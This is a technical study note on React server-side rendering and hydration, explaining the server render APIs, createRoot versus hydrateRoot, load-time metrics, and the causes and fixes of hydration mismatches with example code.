```ad-summary
title: Overview
**SSR (Server-Side Rendering)** means React runs your component tree *on the server* and emits an HTML string. **Hydration** is the second half of that story: the browser receives that HTML, downloads the same JavaScript, and React walks the existing DOM to rebuild its internal [[Fiber Tree|Fiber tree]] and attach event listeners — *without recreating the nodes*.

The payoff is real content in the first HTTP response (good for SEO and perceived speed). The cost is a window where the page **looks ready but isn't**, plus a whole new class of bug: the **hydration mismatch**.

This note fills the gap left by the one-liner in [[5.5 - SPA vs MPA]] ("Needs SSR or hydration for good indexing") and connects it to [[09 - Server-Side Rendering vs Client-Side Rendering]] on the ASP.NET side.
```

## 🕳️ 1. The Problem Hydration Solves

### 1.1. What a pure CSR app actually ships

A Vite/CRA React app ([[5.4 - Create-react-app vs Vite]]) ships an `index.html` that contains **no content at all**:

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>My App</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.jsx"></script>
  </body>
</html>
```

`<div id="root"></div>` is ==literally empty==. Every pixel the user eventually sees is produced by JavaScript at runtime.

### 1.2. The CSR timeline

```
t0  ──►  Browser requests /products/5
t1  ──►  Server returns index.html          (2 KB, empty <div id="root">)
              👀 USER SEES: blank white page
t2  ──►  Browser parses HTML, finds <script>
t3  ──►  Browser downloads main.js          (200–800 KB typical)
t4  ──►  Browser parses + compiles + executes the bundle
t5  ──►  React createRoot(...).render(<App />) runs
              👀 USER SEES: app shell / spinner
t6  ──►  useEffect fires → fetch('/api/products/5')
t7  ──►  JSON arrives → setState → re-render
              👀 USER SEES: actual content
```

The user stares at nothing from `t1` to `t5`, and at a spinner from `t5` to `t7`. On a fast laptop this is ~400 ms. On a mid-range Android phone on 4G it can be **4–8 seconds**.

```ad-warning
title: This is a dependency chain, not a slow network
Notice that `t6` *cannot start* before `t4` finishes: the code that calls `fetch()` does not exist in memory yet. This is exactly the [[Waterfall Effect]] — and [[Code Splitting]] with `React.lazy` makes it **worse**, adding another round trip before the fetch can even be discovered.
```

### 1.3. The crawler / bot problem

Search engines and social-preview bots fetch the URL and read the response body.

| Consumer | Executes JavaScript? | What it sees with pure CSR |
|---|---|---|
| Googlebot | Yes, but on a deferred render queue | Empty page first, real content *maybe* later |
| Bingbot | Limited | Often the empty shell |
| Facebook / Slack / Discord / X unfurlers | **No** | `<div id="root"></div>` → no title, no image, no description |
| Screen readers with JS disabled | No | Nothing |
| `curl` / RSS readers / LLM crawlers | No | Nothing |

```ad-important
Open Graph and Twitter Card tags are read by unfurlers that **never run JavaScript**. Setting `document.title` or injecting `<meta>` tags from a `useEffect` is invisible to them. No amount of client-side `react-helmet` fixes a Slack link preview — that genuinely requires the markup to be in the server's response.
```

This is the concrete meaning of the SEO row in [[5.5 - SPA vs MPA]] and the "SEO can be tricky" note in [[Client-side routing vs Server-side routing]]. See [[SEO]] for why HTML-first indexing is always the safer bet.

```ad-summary
title: Section Summary
- CSR ships an **empty `<div id="root">`** plus a JS bundle; content exists only after the bundle executes.
- Nothing renders between "HTML arrived" and "bundle executed" — a **blank screen**, not a slow one.
- Data fetching is *serialised behind* bundle execution → [[Waterfall Effect]].
- Bots that don't run JS (every social unfurler) see an empty document, so titles, descriptions and preview images are simply absent.
```

## 🖨️ 2. What SSR Actually Produces in React

### 2.1. The core idea

SSR runs **the same components** in a JavaScript runtime on the server (Node, Deno, Bun, an edge worker) and serialises their output to an HTML string.

```jsx
// This component runs unchanged on the server.
function ProductCard({ product }) {
  return (
    <article className="card">
      <h2>{product.name}</h2>
      <p>${product.price}</p>
      <button onClick={() => addToCart(product.id)}>Add to cart</button>
    </article>
  );
}
```

Server output:

```html
<article class="card">
  <h2>Wireless Mouse</h2>
  <p>$29.99</p>
  <button>Add to cart</button>
</article>
```

```ad-danger
title: 🔑 The single most important fact in this note
Look at the `<button>`. The `onClick` handler is **gone**.

HTML is text. A JavaScript function is a live object with a closure over `product`, `addToCart` and the surrounding module scope. ==There is no way to serialise a closure into an HTML attribute.== The server can ship *what the UI looks like*, but never *what the UI does*.

**That gap is the entire reason hydration exists.** SSR alone gives you a photograph of the app; hydration turns the photograph back into the app.
```

### 2.2. The `react-dom/server` API surface

All of these import from `react-dom/server` (never from `react-dom/client`).

| API | Environment | Streaming? | Waits for data? | Hydratable output? |
|---|---|---|---|---|
| `renderToPipeableStream` | **Node.js streams** | ✅ Yes | ✅ Yes (via `<Suspense>`) | ✅ Yes |
| `renderToReadableStream` | **Web Streams** (Deno, Bun, edge, Cloudflare Workers) | ✅ Yes | ✅ Yes (via `<Suspense>`) | ✅ Yes |
| `renderToString` | Anywhere (legacy / no stream support) | ❌ No | ❌ No | ✅ Yes |
| `renderToStaticMarkup` | Anywhere | ❌ No | ❌ No | ❌ **No** |

Plus the static-prerender pair in `react-dom/static`, used by SSG tooling: `prerenderToNodeStream` (Node) and `prerender` (Web Streams), resumed later with `resumeToPipeableStream` / `resume`.

```ad-note
title: Why `renderToStaticMarkup` cannot be hydrated
The streaming APIs and `renderToString` emit extra bookkeeping in the markup (comment markers for Suspense boundaries, `data-react*` attributes) that React needs to align the DOM with its Fiber tree. `renderToStaticMarkup` deliberately omits all of it to produce clean, minimal HTML.

Use it for **HTML emails, PDF templates, RSS bodies, static fragments** — output nobody will ever attach React to. If you try to `hydrateRoot` it, you get mismatches everywhere.
```

### 2.3. `renderToString` — the simple one, and its two hard limits

```jsx
import { renderToString } from 'react-dom/server';
import App from './App.jsx';

app.get('*', (req, res) => {
  const html = renderToString(<App url={req.url} />);

  res.send(`<!doctype html>
<html lang="en">
  <head><meta charset="utf-8" /><title>My App</title></head>
  <body>
    <div id="root">${html}</div>
    <script type="module" src="/assets/main.js"></script>
  </body>
</html>`);
});
```

Simple, synchronous, easy to reason about. The React docs are blunt about the cost:

> `renderToString` does not support streaming or waiting for data.

and

> `renderToString` has limited Suspense support. If a component suspends, `renderToString` immediately sends its fallback as HTML.

```ad-warning
title: The `renderToString` + Suspense trap
If any component in the tree suspends (`React.lazy`, or a promise read with `use`), `renderToString` does **not** wait. It walks up to the nearest `<Suspense>` boundary and emits the `fallback` instead. Your server-rendered HTML then contains a skeleton loader — which is worse than useless for SEO, because the crawler indexes *"Loading…"* as your page content.
```

`renderToString` also blocks: it builds the **whole** document in one synchronous pass before a single byte leaves the server, so TTFB is as slow as your slowest component.

```ad-tip
Never import `react-dom/server` into client code. It drags the whole server renderer into your [[Bundle|bundle]] for no benefit. If you need HTML from a component in the browser, use `createRoot` + `flushSync` and read `innerHTML`.
```

### 2.4. `renderToPipeableStream` — the real Node API

This is what you want on a Node server. It streams, it respects `<Suspense>`, and it injects the hydration bootstrap script for you.

```jsx
// server/index.jsx  — run through a JSX-capable build/loader
import express from 'express';
import { renderToPipeableStream } from 'react-dom/server';
import App from '../src/App.jsx';

const app = express();
app.use(express.static('dist/client', { index: false }));

app.get('*', (req, res) => {
  let didError = false;

  const { pipe, abort } = renderToPipeableStream(
    <App url={req.url} />,
    {
      // The <script> that will call hydrateRoot on the client.
      bootstrapScripts: ['/assets/main.js'],

      // Must match the identifierPrefix passed to hydrateRoot (for useId).
      identifierPrefix: 'app',

      // Fires as soon as the shell (everything outside <Suspense>) is ready.
      // Start streaming here — this is what makes TTFB fast.
      onShellReady() {
        res.statusCode = didError ? 500 : 200;
        res.setHeader('content-type', 'text/html');
        pipe(res);
      },

      // The shell itself blew up: nothing was sent yet, so send a fallback doc.
      onShellError(error) {
        res.statusCode = 500;
        res.setHeader('content-type', 'text/html');
        res.send('<h1>Something went wrong</h1>');
      },

      // Fires for every server error, recoverable or not.
      onError(error) {
        didError = true;
        console.error(error);       // keep this — don't swallow it
      },
    }
  );

  // Don't let a slow backend hold the socket open forever.
  setTimeout(abort, 10_000);
});

app.listen(3000);
```

With `renderToPipeableStream`, the root component is expected to render **the entire document**, including `<html>`:

```jsx
export default function App({ url }) {
  return (
    <html lang="en">
      <head>
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="stylesheet" href="/assets/styles.css" />
        <title>My App</title>
      </head>
      <body>
        <Router url={url} />
      </body>
    </html>
  );
}
```

React injects the doctype and the bootstrap script itself:

```html
<!DOCTYPE html>
<html lang="en">
  <!-- ... your components' HTML ... -->
</html>
<script src="/assets/main.js" async=""></script>
```

```ad-important
title: The shell
> The part of your app outside of any `<Suspense>` boundaries is called *the shell*.

The shell determines the **earliest** thing the user can see, so it should be *minimal but complete* — a skeleton of the page layout. `onShellReady` firing does **not** mean rendering is finished; nested `<Suspense>` boundaries may still be loading.

Trade-off to remember: ==once you start streaming, you can no longer change the HTTP status code.== Decide 200 vs 500 vs 404 inside `onShellReady`, before the first `pipe()`.
```

```ad-note
title: Errors *outside* the shell are survivable
If a component inside a `<Suspense>` boundary throws, React does not abort the response. It:
1. emits that boundary's loading fallback into the HTML,
2. gives up on rendering that subtree on the server,
3. **retries it on the client** once JS loads.

So `onError` fires but you still get `onShellReady`, not `onShellError`. On the client, `onRecoverableError` fires. The user often never notices.
```

Use `onAllReady` instead of `onShellReady` when you want the **complete** HTML in one shot — crawlers and static generation — at the cost of losing progressive loading.

### 2.5. `renderToReadableStream` — edge / Web Streams

Same model, Promise-based, for runtimes with Web Streams (Deno, Bun, Cloudflare Workers, Vercel Edge):

```jsx
import { renderToReadableStream } from 'react-dom/server';
import App from './App.jsx';

export default async function handler(request) {
  try {
    let didError = false;

    const stream = await renderToReadableStream(<App url={request.url} />, {
      bootstrapScripts: ['/assets/main.js'],
      identifierPrefix: 'app',
      onError(error) {
        didError = true;
        console.error(error);
      },
    });

    // For crawlers: wait for everything, give up progressive streaming.
    if (isCrawler(request)) {
      await stream.allReady;
    }

    return new Response(stream, {
      status: didError ? 500 : 200,
      headers: { 'content-type': 'text/html' },
    });
  } catch (error) {
    // The shell failed — nothing was emitted.
    return new Response('<h1>Something went wrong</h1>', {
      status: 500,
      headers: { 'content-type': 'text/html' },
    });
  }
}
```

```ad-warning
Node *can* run `renderToReadableStream` for compatibility, but the React docs advise against it: "not recommended due to worse performance." On Node, use `renderToPipeableStream`.
```

```ad-summary
title: Section Summary
- SSR runs **the same components** in a server-side JS runtime and serialises the result to HTML.
- ==Event handlers are closures and cannot be serialised== — the server ships appearance, never behaviour. This is why a second client-side step is mandatory.
- Pick by environment: `renderToPipeableStream` (Node), `renderToReadableStream` (Web Streams), `renderToString` (no stream support), `renderToStaticMarkup` (non-hydratable static HTML only).
- `renderToString` neither streams nor waits for data, and emits `<Suspense>` **fallbacks** rather than content.
- The streaming APIs let you flush a **shell** early for fast TTFB — but you lose the ability to set the status code once streaming starts.
```

## 💧 3. Hydration Itself

### 3.1. `createRoot` vs `hydrateRoot`

Both live in `react-dom/client`. They look similar and behave completely differently.

```jsx
// ❌ CSR entry — for an empty container
import { createRoot } from 'react-dom/client';
createRoot(document.getElementById('root')).render(<App />);

// ✅ SSR entry — for a container that already holds server HTML
import { hydrateRoot } from 'react-dom/client';
hydrateRoot(document.getElementById('root'), <App />);
```

```ad-important
title: Note the argument order
`createRoot(container).render(<App />)` — two steps, element passed to `render`.
`hydrateRoot(container, <App />)` — **one step**, element is the *second argument*.

This asymmetry trips up almost everyone the first time. With `hydrateRoot` there is usually **no further `render` call at all**.
```

| | `createRoot(container).render(<App />)` | `hydrateRoot(container, <App />)` |
|---|---|---|
| **Expects container to be** | Empty (or disposable) | Pre-filled with React-generated HTML |
| **Existing DOM** | ==Cleared and destroyed== on first `render` | ==Adopted and reused== |
| **DOM nodes** | Created from scratch | Matched against the [[Virtual Dom\|virtual DOM]]; not recreated |
| **First client pass** | A normal initial [[Render\|render]] | A *matching* pass — output compared to the existing DOM |
| **Event listeners** | Attached as part of mounting | Attached to the already-present nodes |
| **Effects (`useEffect`)** | Run after mount | Run after hydration completes |
| **Focus / scroll / user input in the DOM** | Lost | Preserved |
| **Mismatch concept** | Does not exist | Central failure mode |
| **Use when** | Pure SPA / CSR | The HTML came from `react-dom/server` or a prerender |

```ad-danger
title: Using the wrong one silently wastes your SSR
`createRoot` on server-rendered HTML does not error. It just throws the HTML away and rebuilds everything:

> creating a root and calling `root.render` deletes all that HTML, and then re-creates all the DOM nodes from scratch. This can be slower, resets focus and scroll positions, and may lose other user input.

You paid the server's render cost, shipped bigger HTML, and got a *worse* result than plain CSR. Nothing in the console tells you. **This is the single most common way SSR setups quietly fail.**
```

### 3.2. What hydration actually does, step by step

Hydration is **not** a diff against a freshly built DOM. React never builds a second DOM to compare against. It renders the component tree in a special mode where, instead of *creating* host nodes, it *claims* the ones already sitting there.

```
Server HTML already in the document:
<div id="root">
  <article class="card">
    <h2>Wireless Mouse</h2>
    <p>$29.99</p>
    <button>Add to cart</button>
  </article>
</div>

hydrateRoot(container, <App />) then:

1. Walks the component tree, building [[Fiber]] nodes as usual.
2. For each host element it expects, it takes the *next existing DOM node*
   in the container instead of calling document.createElement.
        Fiber(article) ──claims──► <article class="card">
        Fiber(h2)      ──claims──► <h2>
        Fiber(p)       ──claims──► <p>
        Fiber(button)  ──claims──► <button>
3. Checks that type and text content line up. If not → mismatch (§5).
4. Registers the props that HTML could not carry — onClick, onChange,
   refs, controlled-input values — into React's delegated event system.
5. Commits. Only now does the [[Fiber Tree]] mirror the real DOM.
6. Runs layout effects, then passive effects (useEffect).

Result: the DOM nodes are byte-for-byte the same objects the browser
parsed from the response, but they are now wired to React.
```

```ad-note
title: How the event wiring works
React does **not** put `onclick` on each `<button>`. It attaches a small number of listeners at the root container and uses event delegation with [[Synthetic Event|synthetic events]] — see [[How React handle events]].

So "attaching event listeners" during hydration mostly means *populating React's internal props map for each claimed node*, so that when a real click bubbles to the root, React knows which Fiber owns the target and which handler to invoke. That is why hydration is much cheaper than a full mount — and also why a mismatched tree can attach ==the right handler to the wrong element==.
```

### 3.3. The React 18 API change

| React version | Client API | Status |
|---|---|---|
| ≤ 17 | `ReactDOM.hydrate(<App />, container)` | Legacy |
| 18.0 | `hydrateRoot(container, <App />)` | Current; `ReactDOM.hydrate` **deprecated** |
| 19 | `hydrateRoot(container, <App />)` | `ReactDOM.hydrate` **removed** |

```js
// Before (React ≤ 17, deprecated in 18, removed in 19)
import { hydrate } from 'react-dom';
hydrate(<App />, document.getElementById('root'));

// After (React 18+)
import { hydrateRoot } from 'react-dom/client';
hydrateRoot(document.getElementById('root'), <App />);
```

```ad-tip
React 19 ships a codemod for the whole family (`render`, `hydrate`, `unmountComponentAtNode`):

`npx codemod@latest react/19/replace-reactdom-render`
```

This was not a cosmetic rename. `hydrateRoot` is what unlocked **concurrent rendering**, and with it [[#🏝️ 7. Partial, Selective and Progressive Hydration|selective hydration]] — impossible under the legacy all-or-nothing `hydrate`.

### 3.4. `hydrateRoot` options worth knowing

```jsx
import { hydrateRoot } from 'react-dom/client';
import App from './App.jsx';

const root = hydrateRoot(document.getElementById('root'), <App />, {
  // MUST equal the server's identifierPrefix, or every useId() mismatches.
  identifierPrefix: 'app',

  // Fires when React recovers from an error — including hydration mismatches.
  // Wire this to your telemetry; mismatches are otherwise easy to miss in prod.
  onRecoverableError(error, errorInfo) {
    console.error('Recovered:', error, errorInfo.componentStack);
    reportToTelemetry(error, errorInfo);
  },

  onCaughtError(error, errorInfo)   { /* caught by an Error Boundary */ },
  onUncaughtError(error, errorInfo) { /* escaped every Error Boundary */ },
});
```

You can also hydrate the whole document, which is what the streaming APIs expect:

```jsx
hydrateRoot(document, <App />);
```

```ad-warning
Calling `root.render(...)` on a hydration root **before hydration finishes** makes React "clear the existing server-rendered HTML content and switch the entire root to client rendering" — silently discarding your SSR. With `hydrateRoot` you normally never call `root.render` at all.
```

```ad-summary
title: Section Summary
- `createRoot` **destroys** existing DOM and builds fresh; `hydrateRoot` **adopts** the server's DOM and wires it up.
- Argument order differs: `createRoot(c).render(el)` vs `hydrateRoot(c, el)`.
- Hydration walks the tree and *claims* existing nodes instead of creating them, then populates React's delegated event system for each one.
- Using `createRoot` on server HTML is a silent, total waste of SSR — no warning, worse than plain CSR.
- React 18 replaced `ReactDOM.hydrate` with `hydrateRoot`; React 19 removed the old one. The new root API is what makes selective hydration possible.
- Always pass a matching `identifierPrefix` on both sides, and log `onRecoverableError`.
```

## ⏱️ 4. The Timeline and the Uncanny-Valley Window

### 4.1. The four metrics you need

| Metric | Full name | Measures | Who it belongs to |
|---|---|---|---|
| **TTFB** | Time to First Byte | Navigation start → first byte of the response | Server + network |
| **FCP** | First Contentful Paint | First text or image painted | Server + network + CSS |
| **LCP** | Largest Contentful Paint | Largest above-the-fold element painted | **Core Web Vital** |
| **TTI** | Time to Interactive | Page reliably responds to input | Lab metric (see note) |
| **TBT** | Total Blocking Time | Sum of the blocking parts of long tasks | Lab proxy for responsiveness |
| **INP** | Interaction to Next Paint | Responsiveness of *real* user interactions | **Core Web Vital** |

```ad-note
title: TTI is the classic framing, INP is what Google actually scores
TTI is the metric everyone quotes when discussing hydration, and it's the right *mental model*. But it is a **lab** metric, and Lighthouse dropped it from its performance score in v10.

The field metrics that now carry the weight are **LCP** (paint) and **INP** (responsiveness — it replaced FID in March 2024). Hydration hurts **TBT** in the lab and **INP** in the field, because a long hydration task blocks the main thread while the user is trying to click. Don't let the metric rename fool you: the pain is the same, the name changed.
```

### 4.2. The SSR + hydration timeline

```
t0  ──►  Browser requests /products/5
t1  ──►  Server renders <App /> and starts streaming
              ⏱ TTFB
t2  ──►  HTML shell arrives; browser parses and paints
              ⏱ FCP / LCP  👀 USER SEES: the real product page
         ╔══════════════════════════════════════════════════════╗
         ║  🪤 THE UNCANNY VALLEY                              ║
         ║  Content is fully visible.                           ║
         ║  Clicks do nothing. Inputs don't update.             ║
         ║  Dropdowns don't open. React isn't there yet.        ║
         ╚══════════════════════════════════════════════════════╝
t3  ──►  main.js downloads
t4  ──►  main.js parses + compiles + executes
t5  ──►  hydrateRoot() walks the DOM, claims nodes,
         wires up the event system  ← long main-thread task, hurts TBT/INP
t6  ──►  Hydration commits; effects run
              ⏱ TTI  👀 USER: the page finally responds
```

### 4.3. The honest trade-off

| | CSR | SSR + hydration |
|---|---|---|
| TTFB | Fastest (static file) | Slower (server must render) |
| FCP / LCP | **Poor** — blank until JS runs | **Good** — real content in the first response |
| TTI | Earlier *in absolute terms* | ==Often **later**== — same JS, plus hydration work |
| Blank-screen window | Long | None |
| "Looks ready but isn't" window | None | **Present** |
| Total JS shipped | Baseline | Baseline **+ serialised state** (§6) |
| Server cost per request | ~0 (CDN) | CPU-bound render per request |

```ad-danger
title: 🪤 SSR does not make your app faster. It makes it *appear* faster, sooner.
This is the most misunderstood point about SSR. The bundle is the same size. The parse cost is the same. Hydration is **extra** work on top.

So SSR improves **perceived load** (FCP/LCP) while often **worsening actual interactivity** (TTI/TBT/INP). You are trading "user waits at a blank screen" for "user waits at a *page that looks finished*".

Whether that's a win depends entirely on context. For a marketing page nobody clicks in the first second — huge win. For a dashboard where the first thing a user does is hit a filter — you made it worse.
```

```ad-warning
title: Rage clicks
The uncanny valley causes measurable harm: users click a visible button, nothing happens, they click again. React has no handler yet so the interaction is dropped entirely. Then hydration finishes and the *second* click fires — or both do. This is why React 18's [[#🏝️ 7. Partial, Selective and Progressive Hydration|selective hydration]] prioritises the subtree the user actually touched.
```

```ad-tip
title: Mitigations
- Shrink the bundle: [[Code Splitting|code splitting]], `React.lazy`, tree shaking. Hydration cost scales with tree size *and* bundle parse cost.
- Stream with `<Suspense>` so the shell paints even earlier.
- Keep interactive subtrees small; make static parts genuinely static (islands / Server Components — §7).
- Disable or visually de-emphasise controls until hydration completes — an honest skeleton beats a lying button.
```

```ad-summary
title: Section Summary
- **TTFB** → first byte. **FCP/LCP** → first/largest paint. **TTI** → reliably interactive. **TBT/INP** → responsiveness under load.
- SSR makes FCP/LCP much better and frequently makes TTI **worse**, because hydration is additional main-thread work on top of the identical bundle.
- The **uncanny valley** is the window where content is painted but no handler is attached — clicks are silently dropped.
- SSR buys *perceived* speed, not real speed. Judge it against whether your users interact in the first second.
```

## ⚠️ 5. Hydration Mismatches

This is where the theory meets real bug reports.

### 5.1. The contract

> `hydrateRoot()` expects the rendered content to be identical with the server-rendered content. You should treat mismatches as bugs and fix them.

and, on why:

> The user will spend some time looking at the server-generated HTML before your JavaScript code loads. Server rendering creates an illusion that the app loads faster by showing the HTML snapshot of its output. Suddenly showing different content breaks that illusion. This is why the server render output must match the initial render output on the client.

```ad-important
The contract is specifically about the **first client render pass**. Anything after that — state updates, effects, data arriving — is free to diverge as much as it likes. It is only that single initial matching pass that must agree with the server's HTML.

==This fact is the basis of every fix in §5.4.==
```

### 5.2. The causes

React 19's own error message enumerates them, which makes it the best checklist available:

````ad-warning
title: Hydration mismatch — the React 19 console output
```
Uncaught Error: Hydration failed because the server rendered HTML didn't match
the client. As a result this tree will be regenerated on the client.
This can happen if an SSR-ed Client Component used:

- A server/client branch `if (typeof window !== 'undefined')`.
- Variable input such as `Date.now()` or `Math.random()` which changes each
  time it's called.
- Date formatting in a user's locale which doesn't match the server.
- External changing data without sending a snapshot of it along with the HTML.
- Invalid HTML tag nesting.

It can also happen if the client has a browser extension installed which
messes with the HTML before React loaded.
https://react.dev/link/hydration-mismatch

  <App>
    <span>
+    Client
-    Server
```
````

Expanded, with the practical detail:

| # | Cause | Why it breaks | Typical culprit |
|---|---|---|---|
| 1 | **Time** | `Date.now()` / `new Date()` differ between server render and client render by milliseconds *at minimum* | `Rendered {new Date().toLocaleTimeString()}`, "2 minutes ago" relative timestamps |
| 2 | **Randomness** | `Math.random()`, `crypto.randomUUID()`, `nanoid()` never agree | Random IDs, shuffled carousels, A/B bucketing |
| 3 | **Environment branching** | `typeof window !== 'undefined'` is `false` on the server and `true` on the client — the branch is *designed* to diverge | Feature detection, `isMobile` checks |
| 4 | **Browser-only APIs in render** | `window.matchMedia`, `localStorage`, `navigator.*`, `document.*` don't exist server-side | Theme from `localStorage`, `useMediaQuery` |
| 5 | **Locale / timezone** | Server runs `en-US`/UTC; the user's browser runs `vi-VN`/`Asia/Ho_Chi_Minh` | `toLocaleDateString()`, `Intl.NumberFormat`, currency |
| 6 | **Data drift** | Server fetched at T, client refetched at T+200ms and got different rows | Refetching on mount instead of reusing the payload (§6) |
| 7 | **Invalid HTML nesting** | ==The browser silently rewrites the DOM during parsing.== React's tree then can't possibly match the DOM | `<div>` inside `<p>`, bare `<tr>` without `<tbody>`, `<a>` inside `<a>`, `<div>` inside `<span>`-only contexts |
| 8 | **Browser extensions** | Password managers, translators, ad blockers and dark-mode extensions mutate the DOM *before* React loads | Grammarly, LastPass, Google Translate |
| 9 | **Stray whitespace** | Newlines/indentation you inject around the React-generated HTML inside the root node become text nodes React didn't render | Pretty-printing your HTML template |
| 10 | **`identifierPrefix` drift** | Server and client generate different `useId()` values | Forgetting to pass the same prefix to both sides |

````ad-danger
title: 🪤 Cause #7 deserves special attention — it is invisible in your source
The HTML parser enforces the content model. Write this:

```jsx
<p>
  Intro text
  <div>A block inside a paragraph</div>
</p>
```

React's tree says `p > [text, div]`. But the browser **auto-closes the `<p>`** when it hits `<div>`, producing:

```html
<p>Intro text</p>
<div>A block inside a paragraph</div>
<p></p>
```

Three siblings, not a parent with two children. React walks the DOM expecting a `div` inside the `p` and finds nothing there. ==This works perfectly in CSR== (React builds the DOM by `appendChild`, bypassing the parser's content model) and breaks the instant you add SSR. Same story for a bare `<tr>`: the parser inserts a `<tbody>` that isn't in your JSX.

**This is the classic "it worked in dev, it broke when we turned on SSR" bug.**
````

### 5.3. What React does when it finds one

**React 18** logged a cascade of warnings, then gave up on that subtree and re-rendered it on the client:

```
Warning: Text content did not match. Server: "Server" Client: "Client"
Warning: An error occurred during hydration. The server HTML was replaced with
         client content in <div>.
Warning: Text content did not match. Server: "Server" Client: "Client"
Warning: An error occurred during hydration. The server HTML was replaced with
         client content in <div>.
Uncaught Error: Text content does not match server-rendered HTML.
```

**React 19** consolidates all of that into one message with a **diff** (shown in §5.2) pinpointing the component and the differing value — a large practical improvement when debugging.

The recovery behaviour matters more than the logging:

```ad-warning
title: "Recovers" ≠ "fine"
When React hits a mismatch, it discards the server HTML for that tree and regenerates it on the client. That means for that subtree you get:
- **Zero SSR benefit** — you paid for the server render and threw it away.
- **A visible flash** as the DOM is swapped.
- Lost focus, lost scroll, lost in-progress user input inside that tree.
- Extra client work on top of everything else.

And the React docs warn it can be worse than slow:

> React recovers from some hydration errors, but **you must fix them like other bugs.** In the best case, they'll lead to a slowdown; in the worst case, event handlers can get attached to the wrong elements.

Also note: ==attribute mismatches carry no guarantee of being patched at all==. React validates text and structure, not every attribute, because full markup validation would be prohibitively expensive.
```

React 19 is also more tolerant of third-party interference: unexpected tags in `<head>` and `<body>` are skipped over rather than triggering a mismatch, and stylesheets inserted by extensions survive a document-level re-render.

### 5.4. The fixes

#### Fix A — the `useEffect`-sets-state pattern (two-pass render)

The canonical fix. Render the **server-safe** value on the first pass; swap to the client-only value in an effect.

```jsx
// ❌ BROKEN — diverges on the very first pass
function LastUpdated() {
  return <p>Loaded at {new Date().toLocaleTimeString()}</p>;
}

// ✅ FIXED — first pass matches the server, second pass corrects it
import { useState, useEffect } from 'react';

function LastUpdated() {
  const [loadedAt, setLoadedAt] = useState(null);   // null on server AND on first client pass

  useEffect(() => {
    setLoadedAt(new Date());                        // client only, after hydration
  }, []);

  if (!loadedAt) return <p>Loading time…</p>;       // ← what the server emits
  return <p>Loaded at {loadedAt.toLocaleTimeString()}</p>;
}
```

Generalised as an `isClient` flag:

```jsx
function useIsHydrated() {
  const [hydrated, setHydrated] = useState(false);
  useEffect(() => setHydrated(true), []);
  return hydrated;
}

function ThemeToggle() {
  const hydrated = useIsHydrated();
  // localStorage doesn't exist on the server, so don't read it on pass 1.
  const theme = hydrated ? localStorage.getItem('theme') ?? 'light' : 'light';
  return <button disabled={!hydrated}>Theme: {theme}</button>;
}
```

```ad-note
title: Why this works
Effects **do not run on the server**, and they run *after* hydration on the client. So the first client pass produces exactly the server's output → no mismatch. Then the effect fires and React does a normal, legitimate re-render.

The docs describe it precisely: "the initial render pass will render the same content as the server, avoiding mismatches, but an additional pass will happen synchronously right after hydration."
```

```ad-warning
The cost is stated just as plainly: "This approach makes hydration slower because your components have to render twice." Use it for the genuinely client-only bits, not as a blanket policy. If you wrap your whole app in `if (!hydrated) return null`, you have written a CSR app with extra steps and a worse LCP than CSR.
```

#### Fix B — `suppressHydrationWarning` (a scalpel, not a fix)

```jsx
<time dateTime={iso} suppressHydrationWarning>
  {new Date(iso).toLocaleString()}
</time>
```

```ad-danger
title: Read the constraints before reaching for this
1. **It only silences the warning.** The DOM still holds the server's value: "React will **not** attempt to patch mismatched text content." Your users keep seeing the server's timestamp until something else re-renders that node.
2. **It only works one level deep.** It does not cascade to descendants. Putting it on a wrapper `<div>` does nothing for the text three levels down.
3. The docs call it exactly what it is: "an escape hatch. Don't overuse it."

**Legitimate use:** one leaf node whose difference is unavoidable *and* cosmetically irrelevant — a formatted timestamp, a locale-formatted number.

**Illegitimate use:** anything structural, anything the user interacts with, or slapping it on a component you haven't diagnosed. It doesn't fix a mismatch — it hides the smoke while the fire keeps burning, and you lose the console warning that would have told you when the *real* bug appeared.
```

#### Fix C — `useSyncExternalStore` with `getServerSnapshot`

The correct answer whenever the divergent value comes from an **external store** (a theme store, a browser API, a third-party state library).

```jsx
import { useSyncExternalStore } from 'react';

function subscribe(callback) {
  window.addEventListener('online', callback);
  window.addEventListener('offline', callback);
  return () => {
    window.removeEventListener('online', callback);
    window.removeEventListener('offline', callback);
  };
}

function getSnapshot() {
  return navigator.onLine;          // browser only — would throw on the server
}

function getServerSnapshot() {
  return true;                      // stable, server-safe assumption
}

export function useOnlineStatus() {
  return useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot);
}
```

The third argument is the SSR contract:

> **optional** `getServerSnapshot`: A function that returns the initial snapshot of the data in the store. It will be used only during server rendering and during hydration of server-rendered content on the client.

```ad-important
title: The rules of `getServerSnapshot`
- It runs in exactly **two** places: on the server while generating HTML, and on the client **during hydration**. That's precisely what makes the first pass match.
- It must return the **same data** on both: "The server snapshot must be the same between the client and the server."
- It must not touch browser APIs.
- If the store has real server data, **serialise it** (§6): "One way to do this is to emit a `<script>` tag during server rendering that sets a global like `window.MY_STORE_DATA`, and read from that global on the client in `getServerSnapshot`."
- ==Omitting it makes server rendering throw== — which is also the documented way to force a subtree to render client-only.
```

Why this beats Fix A here: with `useSyncExternalStore` there is **no second render pass**. React uses the server snapshot for hydration and then, if the real value differs, transitions correctly on its own. Cleaner, and no double-render cost.

#### Fix D — just fix the HTML

For cause #7 there is no clever hook. Make the markup valid.

```jsx
// ❌ Browser rewrites this during parsing
<p>Intro <div>block</div></p>
<table><tr><td>1</td></tr></table>

// ✅ Valid — DOM matches JSX
<div><p>Intro</p><div>block</div></div>
<table><tbody><tr><td>1</td></tr></tbody></table>
```

```ad-tip
`react/no-unescaped-entities` won't catch this, but `eslint-plugin-jsx-a11y` plus an HTML validator on your rendered output will. If you have SSR, run your generated HTML through a validator in CI — nesting bugs are cheap to catch and expensive to debug.
```

#### Fix summary

| Cause | Right fix |
|---|---|
| Time, randomness | **Fix A** (`useEffect` + state), or generate the value on the server and pass it as a prop |
| Unavoidable formatted leaf | **Fix B** `suppressHydrationWarning` on that one element |
| Browser API / external store | **Fix C** `useSyncExternalStore` + `getServerSnapshot` |
| Locale / timezone | Format on the **server** and send the string, or Fix A |
| Data drift | **§6** — serialise the server's data, don't refetch |
| Invalid nesting | **Fix D** — fix the markup |
| Browser extensions | Mostly unfixable; React 19 tolerates more. Don't chase reports you can't reproduce with extensions disabled |
| `useId` drift | Same `identifierPrefix` on both sides |

```ad-summary
title: Section Summary
